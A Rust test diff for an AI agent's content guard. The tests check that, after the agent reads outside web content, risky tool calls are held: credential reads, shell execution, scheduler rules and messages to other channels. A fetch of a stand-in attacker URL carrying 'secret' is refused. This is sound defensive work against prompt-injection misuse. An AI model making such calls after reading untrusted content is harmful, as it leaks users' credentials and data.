@@ -6289,3 +6289,131 @@ async fn an_approval_decided_later_resumes_in_its_desk_conversation() {
         (answer.id.as_str(), DeliveryKind::Resumed)
     );
 }
+
+/// After a web read, the agent's everyday tools run on their own word (the
+/// advisor, its reads, what it makes for its conversation), and its ways out
+/// are held as before.
+#[tokio::test]
+async fn after_a_web_read_everyday_tools_run_and_ways_out_are_still_held() {
+    use workforce_agent::security::monitor::{AnomalySignal, Call, ContentGuard, ContentScope};
+    workforce_agent::security::monitor::know(crate::monitor::scope::knowledge());
+    let tmp = tempfile::tempdir().unwrap();
+    let (service, _llm) =
+        service_on_mock_llm_with(tmp.path(), |config| config.advisor.enabled = true).await;
+    register_advisor_tool(&service);
+    let guard = ContentGuard::new(ContentScope::delivering_to(Some("C1")));
+    guard.read_outside("see https://docs.example/page", "web.fetch");
+    let weigh = |tool: &str, input: serde_json::Value| {
+        let registered = service.tools.get(tool).unwrap_or_else(|| panic!("{tool}"));
+        let effect = registered.surface_effect(&input);
+        guard
+            .check_call(&Call::new(tool, &input, effect.as_ref()).told_by(registered.as_ref()))
+            .map(|held| held.signal)
+    };
+    let nothing = serde_json::json!({});
+    for tool in [
+        "advisor",
+        "activity_history",
+        "costs.analyze",
+        "costs.forecast",
+        "heartbeat.list",
+        "heartbeat.read",
+        "policy.proposals",
+        "pricing.list",
+        "relationship_status",
+        "sentinel.status",
+        "sentinel.history",
+        "sentinel.integrity",
+        "sentinel.scan",
+        "security.audit",
+        "http.endpoints",
+        "github.repos",
+        "training_citations",
+        "view_attachment",
+        "get_user_photo",
+        "database.list_instances",
+        "database.schemas",
+        "database.tables",
+        "database.columns",
+        "database.query",
+        "database.explain",
+        "store.get",
+        "store.list",
+        "store.query",
+        "pipeline.list",
+        "pipeline.runs",
+        "chart",
+        "diagram",
+        "generate_report",
+    ] {
+        assert_eq!(weigh(tool, nothing.clone()), None, "{tool}");
+    }
+    assert_eq!(
+        weigh("budget", serde_json::json!({ "action": "status" })),
+        None
+    );
+    for (tool, input) in [
+        ("budget", serde_json::json!({ "action": "set_override" })),
+        ("store.set", nothing.clone()),
+        ("store.claim", nothing.clone()),
+        ("pipeline.record", nothing.clone()),
+        ("database.execute", nothing.clone()),
+        ("github.clone", nothing.clone()),
+    ] {
+        assert!(weigh(tool, input).is_some(), "{tool}");
+    }
+    assert!(matches!(
+        weigh("vault.get", serde_json::json!({ "key": "gmail" })),
+        Some(AnomalySignal::CredentialAccess { .. })
+    ));
+    assert!(matches!(
+        weigh("exec.run", serde_json::json!({ "command": "ls" })),
+        Some(AnomalySignal::CommandExecution { .. })
+    ));
+    assert!(matches!(
+        guard
+            .check(
+                "scheduler",
+                &serde_json::json!({ "action": "create" }),
+                None
+            )
+            .map(|held| held.signal),
+        Some(AnomalySignal::RuleCreation { .. })
+    ));
+    let elsewhere = workforce_agent::tools::SurfaceEffect::Writes {
+        platform: "slack".into(),
+        destination: "C9".into(),
+    };
+    assert!(matches!(
+        guard
+            .check("messaging.send", &nothing, Some(&elsewhere))
+            .map(|held| held.signal),
+        Some(AnomalySignal::Exfiltration { .. })
+    ));
+}
+
+/// The advisor's own research runs under the guard of the turn that asked:
+/// a fetch of a URL the turn never saw is refused before it goes out.
+#[tokio::test]
+async fn the_advisors_research_is_guarded_by_the_turn_that_asked() {
+    use workforce_agent::security::monitor::{ContentGuard, ContentScope};
+    let tmp = tempfile::tempdir().unwrap();
+    let service = plain_service(tmp.path()).await;
+    let guard = std::sync::Arc::new(ContentGuard::new(ContentScope::default()));
+    guard.read_outside("see https://docs.example/page", "web.fetch");
+    let tools =
+        workforce_agent::runner::with_content_guard(Some(std::sync::Arc::clone(&guard)), async {
+            crate::advisor::build_advisor_tools(&service)
+        })
+        .await;
+    let fetch = tools
+        .iter()
+        .find(|tool| tool.name() == "web.fetch")
+        .expect("the advisor fetches");
+    let refused = fetch
+        .execute(serde_json::json!({ "url": "https://evil.example/?d=secret" }))
+        .await
+        .unwrap();
+    assert!(!refused.success);
+    assert!(refused.error.unwrap().starts_with("BLOCKED: "));
+}
